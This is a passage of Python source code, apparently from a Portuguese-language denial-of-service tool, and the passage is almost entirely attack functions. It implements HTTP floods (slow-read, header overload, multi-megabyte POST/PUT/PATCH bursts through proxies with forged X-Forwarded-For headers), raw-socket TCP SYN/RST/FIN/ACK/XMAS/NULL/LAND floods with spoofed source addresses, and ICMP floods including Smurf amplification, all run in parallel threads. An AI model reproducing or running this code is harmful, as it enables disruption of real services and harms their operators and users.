    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "Keep-Alive": "timeout=60, max=10000", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.get(f"http://{target}:{port}", headers=headers, timeout=0.02)
            print(Fore.GREEN + f"  [HTTP-KEEPALIVE] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

def slow_read(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            with session.get(f"http://{target}:{port}", headers=headers, stream=True, timeout=0.02) as r:
                for chunk in r.iter_content(chunk_size=1):
                    time.sleep(0.0005)  # Lê ultra lentamente
            print(Fore.GREEN + f"  [SLOW-READ] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

def http_header_overload(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(500):  # 500 cabeçalhos massivos
                headers[f"X-Random-{random.randint(1,10000)}"] = binascii.hexlify(random._urandom(1024)).decode('ascii')
            session.get(f"http://{target}:{port}", headers=headers, timeout=0.02)
            print(Fore.GREEN + f"  [HTTP-HEADER-OVERLOAD] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

def http_random_path_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.get(f"http://{target}:{port}/{random.randint(1,99999999)}", headers=headers, timeout=0.02)
            print(Fore.GREEN + f"  [HTTP-RANDOM-PATH] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

def http_burst_multi_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    methods = ["GET", "POST", "HEAD"]
    payload = "x" * 2097152  # 2MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(100):  # Burst de 100 requisições
                method = random.choice(methods)
                if method == "POST":
                    session.request(method, f"http://{target}:{port}", data=payload, headers=headers, timeout=0.02)
                else:
                    session.request(method, f"http://{target}:{port}", headers=headers, timeout=0.02)
            print(Fore.GREEN + f"  [HTTP-BURST-MULTI] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.000001)

# Ataques TCP (mais poderosos)
def syn_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 65535), 0, 2, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(4096), (target, port))  # 4KB adicional
            print(Fore.GREEN + f"  [SYN] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.000001)

def tcp_rst_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 65535), 0, 4, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(4096), (target, port))
            print(Fore.GREEN + f"  [TCP-RST] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.000001)

def tcp_fin_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 65535), 0, 1, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(4096), (target, port))
            print(Fore.GREEN + f"  [TCP-FIN] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.000001)

def tcp_ack_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 65535), 0, 16, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(4096), (target, port))
            print(Fore.GREEN + f"  [TCP-ACK] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.000001)

def tcp_psh_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 65535), 0, 8, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(4096), (target, port))
            print(Fore.GREEN + f"  [TCP-PSH] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.000001)

def tcp_xmas_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 65535), 0, 41, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(4096), (target, port))
            print(Fore.GREEN + f"  [TCP-XMAS] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.000001)

def tcp_null_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0,
                                    socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", random.randint(1024, 65535), port, random.randint(1, 65535), 0, 0, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(4096), (target, port))
            print(Fore.GREEN + f"  [TCP-NULL] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.000001)

def tcp_land_flood(target, port, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            ip_header = struct.pack("!BBHHHBBH4s4s", 69, 0, 40, random.randint(1, 65535), 0, 64, socket.IPPROTO_TCP, 0, socket.inet_aton(target), socket.inet_aton(target))
            tcp_header = struct.pack("!HHLLBBHHH", port, port, random.randint(1, 65535), 0, 2, 0, 65535, 0, 0)
            sock.sendto(ip_header + tcp_header + random._urandom(4096), (target, port))
            print(Fore.GREEN + f"  [TCP-LAND] Enviado para {target}:{port}" + Style.RESET_ALL)
            sock.close()
        except:
            pass
        time.sleep(0.000001)


# Ataque HTTP-GET Flood
def http_get_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.get(f"http://{target}:{port}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-GET] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)  # Intervalo ultra baixo

# Ataque HTTP-POST Flood
def http_post_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = {"data": "x" * 8388608}  # 8MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.post(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-POST] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-HEAD Flood
def http_head_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.head(f"http://{target}:{port}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-HEAD] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-OPTIONS Flood
def http_options_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.options(f"http://{target}:{port}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-OPTIONS] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-TRACE Flood
def http_trace_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.request("TRACE", f"http://{target}:{port}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-TRACE] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-PUT Flood
def http_put_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 8388608  # 8MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/octet-stream", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.put(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-PUT] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-DELETE Flood
def http_delete_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.delete(f"http://{target}:{port}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-DELETE] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-CONNECT Flood
def http_connect_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=0.01)
            conn.set_tunnel(proxy.address)
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            conn.request("CONNECT", f"{target}:{port}", headers=headers)
            print(Fore.GREEN + f"  [HTTP-CONNECT] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-PATCH Flood
def http_patch_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 8388608  # 8MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/octet-stream", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.patch(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-PATCH] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-GET Mass Flood
def http_get_mass_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", "Content-Length": "8388608"}
            session.get(f"http://{target}:{port}?data={binascii.hexlify(random._urandom(4194304)).decode('ascii')}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-GET-MASS] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-POST Burst Flood
def http_post_burst_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = {"data": "x" * 8388608}  # 8MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(50):  # Burst de 50 requisições
                session.post(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-POST-BURST] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-GET Random Flood
def http_get_random_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.get(f"http://{target}:{port}/{random.randint(1,99999999)}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-GET-RANDOM] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-POST Random Payload Flood
def http_post_random_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            payload = {"data": binascii.hexlify(random._urandom(4194304)).decode('ascii')}  # 4MB payload aleatório
            headers = {"User-Agent": agent, "Content-Type": "application/x-www-form-urlencoded", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.post(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-POST-RANDOM] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-HEAD Mass Flood
def http_head_mass_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", "Content-Length": "8388608"}
            session.head(f"http://{target}:{port}?data={binascii.hexlify(random._urandom(4194304)).decode('ascii')}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-HEAD-MASS] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-OPTIONS Burst Flood
def http_options_burst_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(50):  # Burst de 50 requisições
                session.options(f"http://{target}:{port}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-OPTIONS-BURST] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-TRACE Mass Flood
def http_trace_mass_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", "Content-Length": "8388608"}
            session.request("TRACE", f"http://{target}:{port}?data={binascii.hexlify(random._urandom(4194304)).decode('ascii')}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-TRACE-MASS] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-PUT Random Flood
def http_put_random_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            payload = binascii.hexlify(random._urandom(4194304)).decode('ascii')  # 4MB payload aleatório
            headers = {"User-Agent": agent, "Content-Type": "application/octet-stream", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            session.put(f"http://{target}:{port}/{random.randint(1,99999999)}", data=payload, headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-PUT-RANDOM] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-DELETE Burst Flood
def http_delete_burst_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(50):  # Burst de 50 requisições
                session.delete(f"http://{target}:{port}", headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-DELETE-BURST] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque HTTP-CONNECT Random Flood
def http_connect_random_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=0.01)
            conn.set_tunnel(proxy.address)
            headers = {"User-Agent": agent, "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            conn.request("CONNECT", f"{target}:{port}/{random.randint(1,99999999)}", headers=headers)
            print(Fore.GREEN + f"  [HTTP-CONNECT-RANDOM] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)



# Ataque HTTP-PATCH Burst Flood
def http_patch_burst_flood(target, port, proxy, agent, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    payload = "x" * 8388608  # 8MB payload
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            session = requests.Session()
            session.proxies = {"http": proxy.address, "https": proxy.address}
            headers = {"User-Agent": agent, "Content-Type": "application/octet-stream", "Connection": "keep-alive", "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
            for _ in range(50):  # Burst de 50 requisições
                session.patch(f"http://{target}:{port}", data=payload, headers=headers, timeout=0.01)
            print(Fore.GREEN + f"  [HTTP-PATCH-BURST] Enviado para {target}:{port}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

def start_attack_no_port(attack_func, target, duration):
    global ATTACK_RUNNING
    ATTACK_RUNNING = True
    threads = []
    for _ in range(THREADS):
        thread = threading.Thread(target=attack_func, args=(target, duration))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()
    ATTACK_RUNNING = False
    print(Fore.GREEN + f"{attack_func.__name__.replace('_', ' ').title()} concluído!" + Style.RESET_ALL)




# Ataque ICMP Flood
def icmp_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            ip = scapy.IP(src=scapy.RandIP(), dst=target)
            icmp = scapy.ICMP()
            packet = ip / icmp / (b"x" * 65535)  # Máximo tamanho
            scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ICMP] Enviado para {target}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)  # Intervalo ultra baixo

# Ataque ICMP Smurf
def icmp_smurf(target, broadcast_ip, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            ip = scapy.IP(src=target, dst=broadcast_ip)
            icmp = scapy.ICMP(type=8)
            packet = ip / icmp / (b"x" * 65535)
            scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ICMP-SMURF] Enviado para {broadcast_ip} (spoof: {target})" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque ICMP Ping Flood
def icmp_ping_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            ip = scapy.IP(src=scapy.RandIP(), dst=target)
            icmp = scapy.ICMP(type=8)  # Echo Request
            packet = ip / icmp / random._urandom(32768)  # 32KB adicional
            scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ICMP-PING] Enviado para {target}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque ICMP Burst Flood
def icmp_burst_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            ip = scapy.IP(src=scapy.RandIP(), dst=target)
            icmp = scapy.ICMP()
            packet = ip / icmp / (b"x" * 65535)
            for _ in range(50):  # Burst de 50 pacotes
                scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ICMP-BURST] Enviado para {target}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque ICMP Mass Flood
def icmp_mass_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            ip = scapy.IP(src=scapy.RandIP(), dst=target)
            icmp = scapy.ICMP()
            packet = ip / icmp / (random._urandom(65535) + b"x" * 32768)  # 96KB payload
            scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ICMP-MASS] Enviado para {target}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque ICMP Random Flood
def icmp_random_flood(target, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            ip = scapy.IP(src=scapy.RandIP(), dst=target)
            icmp = scapy.ICMP(type=random.randint(0, 255))  # Tipo aleatório
            packet = ip / icmp / random._urandom(65535)
            scapy.send(packet, verbose=0)
            print(Fore.GREEN + f"  [ICMP-RANDOM] Enviado para {target}" + Style.RESET_ALL)
        except:
            pass
        time.sleep(0.0000001)

# Ataque ICMP Smurf Burst
def icmp_smurf_burst(target, broadcast_ip, duration):
    global ATTACK_RUNNING
    endTime = time.time() + duration
    while ATTACK_RUNNING and time.time() < endTime:
        try:
            ip = scapy.IP(src=target, dst=broadcast_ip)
            icmp = scapy.ICMP(type=8)
            packet = ip / icmp / (b"x" * 65535)
            for _ in range(50):  # Burst de 50 pacotes
